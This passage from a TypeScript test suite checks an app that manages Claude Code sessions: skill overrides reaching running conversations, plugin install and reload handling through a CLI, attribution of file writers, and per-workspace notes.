    // a skill withheld at start stays withheld until it is told `'on'`.
    it('gives a running conversation back a skill the installation stops withholding', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({ disabledSkillDefaults: ['review'] })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.updateConfig({ disabledSkillDefaults: [] })

      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'on' })
    })

    /*
     * The flag layer outranks the user's own files, so a skill octopus stops
     * withholding goes back to what the files the session reads say — asked of
     * the checkout and the sources that session started with.
     */
    it("gives a skill back as the user's settings files say it", async () => {
      const asked: { cwd: string; sources: readonly string[] }[] = []
      const { service, workspaceId } = await withWorkspace({
        skillsInFiles: (cwd, sources) => {
          asked.push({ cwd, sources })
          return Promise.resolve(new Map([['review', 'name-only' as const]]))
        }
      })
      await service.updateConfig({ disabledSkillDefaults: ['review'] })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.updateConfig({ disabledSkillDefaults: [] })

      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'name-only' })
      expect(asked).toEqual([
        { cwd: agent().options().cwd, sources: agent().options().settingSources }
      ])
    })

    it('gives a running conversation back a skill its project stops withholding', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: true
      })

      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'on' })
    })

    /*
     * A session still starting is not in the map a push walks, so it is built
     * from the map as it stands once its awaits are over rather than the one
     * read before them — otherwise a default changed in that window reached
     * nothing. Either way the race falls is right, built with it or told it;
     * the snapshot is not, and with the fix reverted this fails often rather
     * than always, as the mode's version of it does.
     */
    it('starts a conversation on a default changed while it was starting', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      const sent = service.sendToChat(chat.id, 'work')
      await service.updateConfig({ disabledSkillDefaults: ['review'] })
      await sent

      const built = agents[0]?.options().settings
      const told = agents[0]?.flagSettings().at(-1)
      expect([built, told]).toContainEqual(
        expect.objectContaining({ skillOverrides: { review: 'off' } })
      )
    })

    it('tells a running conversation when a skill it withholds is renamed', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.renameStoredSkill({ kind: 'global' }, 'review', 'reviewer')

      expect(agent().flagSettings().at(-1)?.skillOverrides).toMatchObject({ reviewer: 'off' })
    })

    // Nothing reaches a session whose map did not move: its flags carry the
    // effort as well, and a theme has nothing to say to it.
    it('tells a running conversation nothing when the change is not about skills', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.updateConfig({ theme: 'dark' })

      expect(agent().flagSettings()).toEqual([])
    })

    // Each session is sent its own project's answer: a list of one project is
    // nothing to a conversation in another.
    it('tells a conversation in another project nothing when a project\u2019s defaults change', async () => {
      const { service, projectId } = await withWorkspace()
      const elsewhere = join(dir, 'elsewhere')
      await initRepo(elsewhere)
      const other = await service.addProjectFromPath(elsewhere)
      const workspace = await service.createWorkspaceIn(other.id)
      const chat = await service.openChat(workspace.id)
      await service.sendToChat(chat.id, 'work')

      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      expect(agent().flagSettings()).toEqual([])
    })

    it('tells a running conversation nothing when the list is written unchanged', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({ disabledSkillDefaults: ['review'] })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.updateConfig({ disabledSkillDefaults: ['review'] })

      expect(agent().flagSettings()).toEqual([])
    })

    // The write has landed by then; a session that will not answer keeps what
    // it had rather than failing the change for every other one.
    it('keeps a default change that a running session would not take', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      flagsAnswer = () => Promise.reject(new Error('the session has gone'))

      await expect(
        service.updateConfig({ disabledSkillDefaults: ['review'] })
      ).resolves.toMatchObject({ disabledSkillDefaults: ['review'] })
      expect(service.getConfig().disabledSkillDefaults).toEqual(['review'])
    })

    // The same for a conversation's own answers, which are a record rather than
    // a list: an override about another skill keeps its key and its value.
    it('leaves a conversation\u2019s answer about another skill alone', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      const chat = await service.openChat(workspaceId)
      await service.setChatSkill(chat.id, 'review', false)
      await service.setChatSkill(chat.id, 'ship', true)

      await service.renameStoredSkill({ kind: 'global' }, 'review', 'reviewer')

      expect(service.listChats(workspaceId)[0]?.skillOverrides).toEqual({
        reviewer: false,
        ship: true
      })
    })

    // Untouched lists are left as they are: a rename must not rewrite an answer
    // about some other skill on its way past.
    it('leaves answers about other skills alone', async () => {
      const { service, projectId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'ship',
        enabled: false
      })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      await service.renameStoredSkill({ kind: 'global' }, 'review', 'reviewer')

      expect(service.listProjects()[0]?.disabledSkillDefaults).toEqual(['ship', 'reviewer'])
    })

    it('reads the two default lists, narrowest last', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      const chat = await service.openChat(workspaceId)

      await service.updateConfig({ disabledSkillDefaults: ['review'] })
      expect((await service.skillsForChat(chat.id))[0]?.enabled).toBe(false)

      await service.updateConfig({ disabledSkillDefaults: [] })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })
      expect((await service.skillsForChat(chat.id))[0]?.enabled).toBe(false)
    })

    it("lets the conversation's own answer win over both", async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      const chat = await service.openChat(workspaceId)
      await service.setChatSkill(chat.id, 'review', true)

      expect((await service.skillsForChat(chat.id))[0]?.enabled).toBe(true)
      expect(service.listChats(workspaceId)[0]?.skillOverrides).toEqual({ review: true })
    })

    it('hands a session the stores it can load and the skills it may not offer', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      const chat = await service.openChat(workspaceId)
      await service.setChatSkill(chat.id, 'review', false)
      await service.sendToChat(chat.id, 'hello')

      const options = agents[0]?.options()
      expect(options?.additionalDirectories).toEqual([
        join(dir, 'data', 'skills'),
        join(dir, 'data', 'projects', 'planner', 'skills'),
        join(dir, 'data', 'attachments')
      ])
      expect(options?.settings).toMatchObject({ skillOverrides: { review: 'off' } })
    })

    /*
     * The guarantee behind the switch on a repository row in project settings.
     * We never edit that file — it is the checkout's — so switching it off has
     * to work entirely through `skillOverrides`, and the key it goes in under is
     * the bare name, the same one a store skill would use.
     *
     * Asserted at the session rather than at the listing, because a listing
     * that says `enabled: false` while the SDK is handed nothing is exactly
     * the failure a control with nothing behind it looks like.
     */
    it("keeps a checkout's own skill out of a session when the project turns it off", async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const workspace = (await service.listWorkspaces(projectId))[0]
      if (!workspace) throw new Error('no workspace')
      await placeInRepo(workspace.path, 'xibo-bridge')
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'xibo-bridge',
        enabled: false
      })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      expect(agents[0]?.options().settings).toMatchObject({
        skillOverrides: { 'xibo-bridge': 'off' }
      })
      // Our own stores go over as they always do — this skill is not in either
      // of them, and `skillOverrides` is what keeps it out rather than the roots.
      expect(agents[0]?.options().additionalDirectories).toEqual([
        join(dir, 'data', 'skills'),
        join(dir, 'data', 'projects', 'planner', 'skills'),
        join(dir, 'data', 'attachments')
      ])
    })

    /*
     * Both stores go over even when both are empty, and this test is the one
     * the bug was written into as an expectation.
     *
     * The roots are handed over **once**, at session start, and
     * `reloadSkills` re-scans only the directories the session already knows
     * about. A store omitted for being empty was therefore invisible to that
     * conversation for its whole life — every skill later written into it, not
     * merely the first — while the composer's panel listed it as available,
     * because that path re-reads disk on every call. The state of every fresh
     * install, and nothing on screen said a restart was needed.
     */
    it('hands over both stores while they are empty, so a skill written later arrives', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'hello')

      const globalRoot = join(dir, 'data', 'skills')
      const projectRoot = join(dir, 'data', 'projects', projectId, 'skills')
      expect(agents[0]?.options().additionalDirectories).toEqual([
        globalRoot,
        projectRoot,
        join(dir, 'data', 'attachments')
      ])

      // And they exist, because `--add-dir` on a directory that is not there is
      // at best untested — neither of ours exists until the first write.
      await expect(stat(skillsDirOf(globalRoot))).resolves.toMatchObject({})
      await expect(stat(skillsDirOf(projectRoot))).resolves.toMatchObject({})
    })

    /*
     * A switch whose effect waits for a restart is a switch that looks broken.
     * The flag layer takes this mid-session the way it takes the effort.
     */
    it('reaches a running conversation rather than waiting for its next start', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')
      await service.setChatSkill(chat.id, 'review', false)

      expect(agents[0]?.flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'off' })

      await service.setChatSkill(chat.id, 'review', true)

      // Said out loud: a key left out does not undo a withhold the session
      // started with, measured against a live one.
      expect(agents[0]?.flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'on' })
    })

    it('records the answer even with no session to tell', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.setChatSkill(chat.id, 'in-repo', false)

      expect(agents).toHaveLength(0)
      expect(service.listChats(workspaceId)[0]?.skillOverrides).toEqual({ 'in-repo': false })
    })

    it('refuses to answer for a conversation that is not there', async () => {
      const { service } = await withWorkspace()

      await expect(service.skillsForChat('chat-nowhere')).rejects.toBeInstanceOf(WorkspaceError)
      await expect(service.setChatSkill('chat-nowhere', 'x', false)).rejects.toBeInstanceOf(
        WorkspaceError
      )
    })

    /*
     * The reload follows a write that has already succeeded, so a session that
     * will not answer is a stale listing rather than a lost skill — and the
     * save must not report a failure for it.
     */
    it('does not fail a save because a session would not reload', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      skillReload = () => Promise.reject(new Error('the transport is closed'))

      await expect(
        service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      ).resolves.toMatchObject({ name: 'review' })
    })

    /*
     * A skill written while a conversation is open would otherwise not exist
     * for it: the session listed the directories when it started. Asserted by
     * counting the reloads rather than by the calls resolving — which they do
     * whether or not anything is told.
     *
     * Counting is only half, and the missing half is worth naming here because
     * this test passed for months while the reload had nowhere to look: a root
     * omitted at start-up is not one `reloadSkills` re-scans. That the roots go
     * over at all is asserted by 'hands over both stores while they are empty'.
     */
    it('tells a running conversation to look at the directories again after a write', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      let reloads = 0
      skillReload = () => {
        reloads += 1
        return Promise.resolve({ skills: [] })
      }

      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      expect(reloads).toBe(1)

      await service.importStoredSkill(
        { kind: 'global' },
        { kind: 'text', text: DOCUMENT.replace('review', 'second') }
      )
      expect(reloads).toBe(2)

      await service.removeStoredSkill({ kind: 'global' }, 'review')
      expect(reloads).toBe(3)
    })

    // Nothing running, nothing to tell. A write with no session should not be
    // reaching for one.
    it('tells nothing when no conversation is running', async () => {
      const { service } = await withWorkspace()

      let reloads = 0
      skillReload = () => {
        reloads += 1
        return Promise.resolve({ skills: [] })
      }

      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      expect(reloads).toBe(0)
      expect(agents).toHaveLength(0)
    })
  })

  async function waitForRequest(events: ChatEvent[]): Promise<string> {
    await vi.waitFor(() => {
      expect(events.some((entry) => entry.event.type === 'permission_request')).toBe(true)
    })

    const found = events.find((entry) => entry.event.type === 'permission_request')
    if (found?.event.type !== 'permission_request') throw new Error('no request was emitted')

    return found.event.requestId
  }

  describe('Claude Code plugins', () => {
    const ok = `${JSON.stringify({ outcome: 'ok' })}\n`
    /** `a@m`, installed for the user — what a switch or a removal checks first. */
    const installed = JSON.stringify([{ id: 'a@m', scope: 'user', enabled: true }])

    const out = (stdout: string): Promise<CliOutput> => Promise.resolve({ stdout, stderr: '' })

    /** A CLI answering every write with success, and recording what it ran. */
    function okCli(): { cli: PluginCli; ran: string[] } {
      const ran: string[] = []
      const cli: PluginCli = (args) => {
        const command = args.join(' ')
        ran.push(command)
        return out(command === 'plugin list --json' ? installed : ok)
      }

      return { cli, ran }
    }

    /** Two conversations, each with a session, in one workspace. */
    async function twoRunning(cli: PluginCli, extra: ServiceOptions = {}): Promise<OctopusService> {
      const { service, workspaceId } = await withWorkspace({ pluginCli: cli, ...extra })
      const first = await service.openChat(workspaceId)
      // `createChat`, not a second `openChat`: that answers with the first.
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'one')
      await service.sendToChat(second.id, 'two')

      return service
    }

    /*
     * Measured on 2.1.299: nothing picks a plugin change up by itself. Without
     * the reload an open conversation goes on offering a plugin that was just
     * switched off, and the switch looks broken.
     */
    it('reloads every running conversation after each write, and counts them', async () => {
      const { cli, ran } = okCli()
      const service = await twoRunning(cli)

      await expect(service.installPlugin('a@m')).resolves.toEqual({
        kind: 'installed',
        reloaded: 2
      })
      await expect(service.setPluginEnabled('a@m', false, { scope: 'user' })).resolves.toEqual({
        reloaded: 2
      })
      await expect(service.uninstallPlugin('a@m', { scope: 'user' })).resolves.toEqual({
        reloaded: 2
      })

      expect(agents.map((session) => session.pluginReloads())).toEqual([3, 3])
      expect(ran.filter((command) => command !== 'plugin list --json')).toEqual([
        'plugin install a@m --scope user --json',
        'plugin disable a@m --scope user --json',
        'plugin uninstall a@m --scope user --json'
      ])
    })

    it('counts a conversation that would not reload out, and the write stands', async () => {
      const { cli } = okCli()
      const service = await twoRunning(cli)
      let calls = 0
      pluginReload = () => {
        calls++
        return calls === 1
          ? Promise.reject(new Error('the transport is closed'))
          : Promise.resolve({})
      }

      await expect(service.setPluginEnabled('a@m', true, { scope: 'user' })).resolves.toEqual({
        reloaded: 1
      })
    })

    /*
     * The reload runs inside the write queue. Unbounded, one session that never
     * answered held every later install, switch and removal behind it.
     */
    it('gives up on a conversation that never answers, and the next write goes ahead', async () => {
      const { cli } = okCli()
      const service = await twoRunning(cli, { pluginReloadMs: 50 })
      let calls = 0
      pluginReload = () => {
        calls++
        return calls === 1 ? new Promise(() => undefined) : Promise.resolve({})
      }

      await expect(service.setPluginEnabled('a@m', false, { scope: 'user' })).resolves.toEqual({
        reloaded: 1
      })
      await expect(service.setPluginEnabled('a@m', true, { scope: 'user' })).resolves.toEqual({
        reloaded: 2
      })
    })

    it('reloads nothing while an install waits for a person to read its command', async () => {
      const sha = 'c'.repeat(64)
      const cli: PluginCli = () =>
        out(
          `${JSON.stringify({ outcome: 'failed', shownCommand: { command: 'npx run', sha256: sha } })}\n`
        )
      const service = await twoRunning(cli)

      await expect(service.installPlugin('a@m')).resolves.toEqual({
        kind: 'needsConsent',
        command: 'npx run',
        sha256: sha,
        reloaded: 0
      })
      expect(agents.map((session) => session.pluginReloads())).toEqual([0, 0])
    })

    it('reloads nothing for a write that failed', async () => {
      const cli: PluginCli = (args) =>
        out(
          args[1] === 'list'
            ? installed
            : `${JSON.stringify({ outcome: 'failed', message: 'nope' })}\n`
        )
      const service = await twoRunning(cli)

      await expect(service.uninstallPlugin('a@m', { scope: 'user' })).rejects.toMatchObject({
        code: 'pluginActionFailed'
      })
      expect(agents.map((session) => session.pluginReloads())).toEqual([0, 0])
    })

    /*
     * Each CLI process reads `settings.json`, changes it and writes it back.
     * Two at once and the second to finish puts back what the first removed.
     */
    it('runs one write at a time, even after one fails', async () => {
      const log: string[] = []
      let release: () => void = () => undefined
      const held = new Promise<void>((resolve) => {
        release = resolve
      })
      const cli: PluginCli = async (args) => {
        const verb = args[1] ?? ''
        if (verb === 'list') return { stdout: installed, stderr: '' }
        log.push(`${verb} starts`)
        if (verb === 'install') {
          await held
          log.push('install ends')
          return {
            stdout: `${JSON.stringify({ outcome: 'failed', message: 'clone failed' })}\n`,
            stderr: ''
          }
        }
        return { stdout: ok, stderr: '' }
      }
      const { service } = await withWorkspace({ pluginCli: cli })

      const install = service.installPlugin('a@m')
      const disable = service.setPluginEnabled('a@m', false, { scope: 'user' })
      await vi.waitFor(() => {
        expect(log).toEqual(['install starts'])
      })
      release()

      await expect(install).rejects.toMatchObject({ code: 'pluginActionFailed' })
      await expect(disable).resolves.toEqual({ reloaded: 0 })
      expect(log).toEqual(['install starts', 'install ends', 'disable starts'])
    })

    it('reads the lists and changes the catalog through the CLI', async () => {
      const ran: string[] = []
      const cli: PluginCli = (args) => {
        const command = args.join(' ')
        ran.push(command)
        if (command === 'plugin list --json') return out('[]')
        if (command === 'plugin marketplace list --json') return out('[]')
        return out(ok)
      }
      const service = await twoRunning(cli)

      await expect(service.listPlugins()).resolves.toEqual([])
      await expect(service.pluginCatalog()).resolves.toMatchObject({ officialConnected: false })
      await service.connectOfficialMarketplace()
      await service.refreshPluginCatalog()

      expect(ran).toEqual([
        'plugin list --json',
        'plugin marketplace list --json',
        'plugin marketplace add anthropics/claude-plugins-official --json',
        'plugin marketplace update claude-plugins-official --json'
      ])
      // A marketplace is not something a conversation loads.
      expect(agents.map((session) => session.pluginReloads())).toEqual([0, 0])
    })
  })

  describe('who wrote which file', () => {
    /** The workspace as the changes pane reads it. */
    async function writersOf(
      service: OctopusService,
      projectId: string,
      workspaceId?: string
    ): Promise<Record<string, readonly string[]>> {
      const listed = await service.listWorkspaces(projectId)
      const workspace =
        workspaceId === undefined ? listed[0] : listed.find((one) => one.id === workspaceId)
      if (!workspace) throw new Error('the workspace is gone')
      return workspace.writers
    }

    it('records the conversation that made the edit', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      agent().emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'a',
          new_string: 'b'
        })
      )
      agent().emit(resultMessage)

      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toEqual({ 'notes.txt': [chat.id] })
      })
    })

    /*
     * The point of the whole record. Three conversations share one worktree and
     * the pane shows their work as a single diff, so a file has to say which of
     * them left it changed.
     */
    it('records both conversations that wrote the same file', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'edit it')
      await service.sendToChat(second.id, 'edit it too')

      const [one, other] = agents
      if (!one || !other) throw new Error('both sessions should be running')

      one.emit(toolCallMessage('c-1', 'Edit', { file_path: 'shared.ts' }))
      one.emit(resultMessage)
      other.emit(toolCallMessage('c-2', 'Write', { file_path: 'shared.ts' }))
      other.emit(toolCallMessage('c-3', 'Write', { file_path: 'only-theirs.ts' }))
      other.emit(resultMessage)

      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toEqual({
          'shared.ts': [first.id, second.id],
          'only-theirs.ts': [second.id]
        })
      })
    })

    // Two workspaces at work at once is the ordinary state of this app, and a
    // turn ending in one must not write anything against the other.
    it('records against the workspace whose conversation wrote it', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const second = await service.createWorkspaceIn(projectId)
      const here = await service.openChat(workspaceId)
      const there = await service.openChat(second.id)
      await service.sendToChat(here.id, 'edit it')
      await service.sendToChat(there.id, 'edit it')

      const [one, other] = agents
      if (!one || !other) throw new Error('both sessions should be running')

      one.emit(toolCallMessage('c-1', 'Edit', { file_path: 'here.ts' }))
      one.emit(resultMessage)
      other.emit(toolCallMessage('c-2', 'Edit', { file_path: 'there.ts' }))
      other.emit(resultMessage)

      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId, second.id)).toEqual({ 'there.ts': [there.id] })
      })
      expect(await writersOf(service, projectId, workspaceId)).toEqual({ 'here.ts': [here.id] })
    })

    /*
     * The record outlives the turn that made it. A file one conversation wrote
     * last week and another rewrites today belongs to both, so a turn merges
     * into what is stored rather than replacing it — and a file written twice
     * in one turn is written by one conversation, not by it twice over.
     */
    it('adds a later turn to what is already there, without repeating itself', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'edit it')

      agent().emit(toolCallMessage('c-1', 'Edit', { file_path: 'notes.txt' }))
      agent().emit(toolCallMessage('c-2', 'Edit', { file_path: 'notes.txt' }))
      agent().emit(resultMessage)
      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toEqual({ 'notes.txt': [first.id] })
      })

      await service.sendToChat(second.id, 'edit it too')
      const other = agents[1]
      if (!other) throw new Error('the second session should be running')
      other.emit(toolCallMessage('c-3', 'Write', { file_path: 'notes.txt' }))
      other.emit(resultMessage)

      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toEqual({ 'notes.txt': [first.id, second.id] })
      })

      /* And the same conversation coming back to the same file, which is what
         an agent does all day: the entry stays one name long rather than
         growing by one every turn. */
      await service.sendToChat(first.id, 'once more')
      agent().emit(toolCallMessage('c-4', 'Edit', { file_path: 'notes.txt' }))
      // A file nothing has seen before, so the turn's write can be waited for:
      // waiting on the entry that must not change would be waiting for nothing.
      agent().emit(toolCallMessage('c-5', 'Edit', { file_path: 'fresh.ts' }))
      agent().emit(resultMessage)

      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toMatchObject({ 'fresh.ts': [first.id] })
      })
      expect((await writersOf(service, projectId))['notes.txt']).toEqual([first.id, second.id])
    })

    /*
     * A turn's worth of edits, one write of `state.json`. An agent makes dozens
     * in a turn and `commit` writes the file whole, so recording each as it
     * lands would be a write per edit.
     */
    it('writes nothing down until the turn ends', async () => {
      const { service, projectId, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      agent().emit(toolCallMessage('c-1', 'Edit', { file_path: 'notes.txt' }))
      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_use')).toBe(true)
      })

      expect(await writersOf(service, projectId)).toEqual({})

      agent().emit(resultMessage)
      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toEqual({ 'notes.txt': [chat.id] })
      })
    })

    // Not a file this workspace's diff can show, so not one the pane could
    // attribute either.
    it('ignores a path outside the worktree', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      agent().emit(toolCallMessage('c-1', 'Edit', { file_path: join(dir, 'elsewhere.ts') }))
      agent().emit(toolCallMessage('c-2', 'Edit', { file_path: 'notes.txt' }))
      agent().emit(resultMessage)

      await vi.waitFor(async () => {
        expect(await writersOf(service, projectId)).toEqual({ 'notes.txt': [chat.id] })
      })
    })

    /*
     * A workspace can go while its session is still speaking — the removal is
     * forced and the stream is not — so an edit can arrive with nowhere to be
     * recorded. What matters is that the turn carries on: an exception here
     * would take the reader loop with it, and every later event of that session
     * with the loop.
     */
    it('carries on when the workspace an edit belongs to has gone', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      await service.removeWorkspaceById(workspaceId, { force: true })
      agent().emit(toolCallMessage('c-1', 'Edit', { file_path: 'notes.txt' }))
      agent().emit(textMessage('carried on'))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'text')).toBe(true)
      })
    })

    // `Read` names a `file_path` exactly as an edit does.
    it('does not attribute a file to whoever only read it', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look at it')

      agent().emit(toolCallMessage('c-1', 'Read', { file_path: 'notes.txt' }))
      agent().emit(resultMessage)

      // The turn is over before the record is read, or an empty answer would
      // only mean the write had not happened yet.
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      expect(await writersOf(service, projectId)).toEqual({})
    })
  })
})

describe('the note a workspace carries for its user', () => {
  it('starts empty and keeps what is written', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const listed = async (): Promise<string | undefined> =>
      (await service.listWorkspaces(project.id)).find((one) => one.id === workspace.id)?.notes

    await expect(listed()).resolves.toBe('')

    await service.setWorkspaceNotes(workspace.id, 'check the migration before opening it')

    await expect(listed()).resolves.toBe('check the migration before opening it')
  })

  // One note per workspace is the whole of the feature, so writing one must not
  // be visible from another.
  it("leaves another workspace's note alone", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const first = await service.createWorkspaceIn(project.id)
    const second = await service.createWorkspaceIn(project.id)

    await service.setWorkspaceNotes(first.id, 'mine')

    const listed = await service.listWorkspaces(project.id)
    expect(listed.find((one) => one.id === first.id)?.notes).toBe('mine')
    expect(listed.find((one) => one.id === second.id)?.notes).toBe('')
  })

  it('survives the service being started again', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await service.setWorkspaceNotes(workspace.id, 'kept')

    const reopened = await createService(paths(dir))

    await expect(reopened.listWorkspaces(project.id).then((all) => all[0]?.notes)).resolves.toBe(
      'kept'
    )
  })

  /*
   * The whole reason the note is a field on the record rather than a file of
   * its own: removing the workspace takes it, and renaming keeps it, without
   * anybody arranging either. A file would have to be moved and deleted by
   * hand, and the day somebody forgot, a new workspace of the same name would
   * open holding a stranger's note.
   */
  it('goes when its workspace goes', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await service.setWorkspaceNotes(workspace.id, 'about this one')

    await service.removeWorkspaceById(workspace.id, { force: true })

    await expect(service.listWorkspaces(project.id)).resolves.toEqual([])
    // And it is gone from the file, not merely from the list: a workspace made
    // again under the same name must not come back holding it.
    await expect(readFile(join(dir, 'state.json'), 'utf8')).resolves.not.toContain('about this one')
  })

  it('follows a workspace that is renamed', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await service.setWorkspaceNotes(workspace.id, 'kept through the rename')

    await service.renameWorkspaceById(workspace.id, 'renamed')

    await expect(service.listWorkspaces(project.id).then((all) => all[0]?.notes)).resolves.toBe(
      'kept through the rename'
    )
  })

  it('refuses a workspace that is not there', async () => {
    const service = await createService(paths(dir))

    await expect(service.setWorkspaceNotes('planner/nowhere', 'x')).rejects.toBeInstanceOf(
      WorkspaceError
    )
  })
})

describe('the commands and subagents a store holds', () => {
  let service: OctopusService
  let projectId: string

  beforeEach(async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    projectId = project.id
  })

  const global = { kind: 'global' } as const
  const ofProject = (): { kind: 'project'; projectId: string } => ({ kind: 'project', projectId })

  const SUBAGENT = '---\nname: reviewer\ndescription: When reviewing.\n---\n\nYou review.'

  it('starts with nothing in either store', async () => {
    await expect(service.listLibrary(global, 'command')).resolves.toEqual([])
    await expect(service.listLibrary(ofProject(), 'subagent')).resolves.toEqual([])
  })

  it('writes a command where a session will find it', async () => {
    const written = await service.createLibraryEntry(global, 'command', 'ship', 'Commit and push.')

    // The directory is Claude Code's, and getting it wrong makes everything
    // here invisible to the session while every test still passes.
    expect(written.path).toBe(join(dir, 'data', 'skills', '.claude', 'commands', 'ship.md'))
    await expect(readFile(written.path, 'utf8')).resolves.toBe('Commit and push.')
  })

  it('writes a subagent where a session will find it', async () => {
    const written = await service.createLibraryEntry(global, 'subagent', 'reviewer', SUBAGENT)

    expect(written.path).toBe(join(dir, 'data', 'skills', '.claude', 'agents', 'reviewer.md'))
    expect(written.description).toBe('When reviewing.')
  })

  it("keeps a project's own apart from the installation's", async () => {
    await service.createLibraryEntry(global, 'command', 'ship', 'x')
    await service.createLibraryEntry(ofProject(), 'command', 'deploy', 'y')

